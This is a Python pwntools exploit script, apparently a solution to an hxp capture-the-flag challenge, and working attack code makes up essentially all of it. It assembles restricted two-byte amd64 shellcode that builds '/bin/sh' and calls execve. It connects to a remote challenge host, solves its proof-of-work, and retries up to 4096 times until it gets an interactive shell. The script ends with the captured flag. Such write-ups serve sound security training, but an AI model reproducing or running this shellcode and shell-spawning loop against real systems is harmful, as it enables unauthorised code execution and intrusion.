#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('vuln')


def asm_one(source):
    code = asm(source)
    assert len(code) == 2, (source, len(code))
    assert code[0] != 0x0f
    assert code[0] != 0xcd
    return code


code = b''.join(asm_one(source) for source in (
    # don't 'mov cl, 16' - trade zeroing out edx for 1/256 chance of success
    'xor edx, edx',
    'xor edi, eax',
    'mov ah, 0x3a',
    'mov al, 0x24',
    'shl eax, cl',
    'mov ah, 0x8c',
    # don't 'mov al, 0xa1' - we don't want to be at page start
    'xor edi, eax',

    # +-esi
    # v
    # b'\0\0\0\0'
    # ^
    # +-edi
    'mov esi, edi',

    # +-esi
    # v
    # b'/bin\0\0\0\0'
    #       ^
    #       +-edi
    'mov al, 0x69',  # i
    'mov ah, 0x6e',  # n
    'shl eax, cl',
    'mov al, 0x2f',  # /
    'mov ah, 0x62',  # s
    'stosd; std',

    # +-esi
    # v
    # b'\0\0\0\0\0\0\0\0/bin\0\0\0\0'
    #                       ^
    #                       +-edi
    'lodsd; lodsd',

    # +-esi
    # v
    # b'\0\0\0\0\0\0\0\0\0\0\0\0/bin/sh\0'
    #                           ^
    #                           +-edi
    'mov al, 0x68',  # h
    # ah is 0 thanks to lodsd
    'shl eax, cl',
    'mov al, 0x2f',  # /
    'mov ah, 0x73',  # s
    'stosd; lodsd',

    # eax is 0 thanks to lodsd
    'mov al, 59',
))
assert len(code) == 42, len(code)


def mk_io():
    if args.LOCAL:
        io = process([elf.path])
        if args.GDB:
            gdb.attach(io, gdbscript='''
catch syscall mprotect
tui enable
layout asm
layout regs
c
''')
    else:
        io = remote('78.46.163.223', 1336)
        regex = r'''please give S such that sha256\(unhex\("(.+)" \+ S\)\) ends with (\d+)'''
        line = io.recvline_regex(regex)
        prefix, bits = re.search(regex, line.decode()).groups()
        t0 = time.time()
        pow = subprocess.check_output(['./pow-solver', bits, prefix]).strip()
        print(f'PoW took {time.time() - t0}s')
        io.sendline(pow)
    return io


for attempt in range(4096):
    print(f'attempt = {attempt}')
    io = mk_io()
    io.send(code)
    try:
        io.recvuntil('$', timeout=1)
    except EOFError:
        io.close()
        continue
    io.interactive()


# hxp{I_sh0UlD_h4Ve_U53d_48_b1t_AdDrz}
